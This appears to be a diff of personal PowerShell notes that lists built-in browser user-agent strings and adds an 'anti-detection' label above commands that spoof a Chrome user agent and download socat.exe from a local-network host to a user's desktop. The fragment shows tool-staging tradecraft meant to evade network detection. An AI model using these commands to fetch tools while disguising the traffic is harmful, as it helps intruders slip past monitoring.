@@ -15,5 +15,7 @@ Listing out User Agents-below:
 
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 
+anti-detection
+
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 Invoke-WebRequest http://192.168.0.101:8000/socat.exe -UserAgent $UserAgent -OutFile "C:\Users\Kostya Nikolaev\Desktop\myHash\soact.exe"
